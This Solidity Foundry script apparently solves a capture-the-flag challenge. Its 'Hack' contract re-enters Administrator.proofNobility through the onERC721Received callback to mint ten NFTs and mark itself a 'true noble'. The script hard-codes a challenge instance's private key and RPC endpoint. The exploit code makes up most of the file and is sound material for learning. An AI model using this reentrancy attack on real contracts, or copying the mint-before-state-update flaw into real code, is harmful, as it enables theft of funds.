// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x26094a907D297B2aA47857b3830e58b076019e8f);
    address wallet = 0xE5EFc14edeF54bb7429E54DfCa3bA2b93a66bFEF;
    Administrator public target = setup.admin();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xe41542a77f5f64b3d3747299cba16ad55430982857536c7e4bfabab53d329e4f);

        console.log(wallet.balance);

        Hack hack = new Hack(address(target));

        hack.attack{value: 11 ether}();

        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	dac75994-a948-4d8b-94fe-429db9c9fce8
// RPC Endpoint	http://103.178.153.113:40012/dac75994-a948-4d8b-94fe-429db9c9fce8
// Private Key	0xe41542a77f5f64b3d3747299cba16ad55430982857536c7e4bfabab53d329e4f
// Setup Contract	0x26094a907D297B2aA47857b3830e58b076019e8f
// Wallet	0xE5EFc14edeF54bb7429E54DfCa3bA2b93a66bFEF


contract Hack {
    uint256 public count;
    Administrator public target;

    constructor(address _target) {
        target = Administrator(_target);
    }

    function attack() external payable {
        target.proofNobility{value: 1 ether}();
        target.isTrueNoble();
    }
    
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        if (count < 9) {
            count++;
            target.proofNobility{value: 1 ether}();
        }
        return this.onERC721Received.selector;
    }
}
contract Setup{
    Noble public noble;
    Administrator public admin;

    constructor() {
        noble = new Noble();
        admin = new Administrator(address(noble), 1 ether);
        noble.setAdministrator(address(admin));
    }

    function isSolved() public view returns(bool){
        return admin.trueNoble();
    }
}

contract ERC721 {

    constructor(string memory a, string memory b) {

    }
    function _safeMint(address, uint256) internal {
        1;
    }
}

abstract contract ERC721URIStorage is ERC721 {
    constructor()  {

    }
}

contract Noble is ERC721URIStorage {

    struct NobilityStatus{
        address NoblePeople;
        bool isNoble;
    }

    address public owner;
    address public administrator;
    uint256 public nobilityCounter = 1;
    mapping(address => uint256) public NobilityInPossession;
    mapping(uint256 => NobilityStatus) public NOBLENFT;

    modifier onlyOwner{
        require(msg.sender == owner, "Owner Only Function");
        _;
    }   

    modifier onlyAdministrator{
        require(msg.sender == administrator);
        _;
    }

    constructor() payable ERC721("Nobility", "NOBLE"){
        owner = msg.sender;
    }


    function setAdministrator(address _administrator) public onlyOwner{
        administrator = _administrator;
    }

    function mintNobility(address _to) public onlyAdministrator{
        uint256 newNobleNFT = nobilityCounter++;
        NobilityInPossession[_to] += 1;

        _safeMint(_to, newNobleNFT);
        NOBLENFT[newNobleNFT] = NobilityStatus({
            NoblePeople: _to,
            isNoble: true
        });
    }

    function getProofOfNobility(uint256 _id) public view returns (NobilityStatus memory){
        return NOBLENFT[_id];
    }

    function getNobilityInPossession(address _who) public view returns(uint256){
        return NobilityInPossession[_who];
    }

}

contract Administrator{

    Noble public noble;

    bool public trueNoble;
    uint256 public fee;
    address public owner;

    mapping(address => bool) public joined;

    constructor(address _noble, uint256 _fee) {
        owner = msg.sender;
        noble = Noble(_noble);
        fee = _fee;
    }

    function proofNobility() public payable{
        require(msg.value == fee, "The Fee, you must pay it!");
        require(joined[msg.sender] == false, "You are one of them already!");
        noble.mintNobility(msg.sender);
        joined[msg.sender] = true;
    }

    function isTrueNoble() public{
        require(joined[msg.sender] == true, "Must be at least Noble!");
        if(noble.getNobilityInPossession(msg.sender) == 10){
            trueNoble = true;
        }
    }

}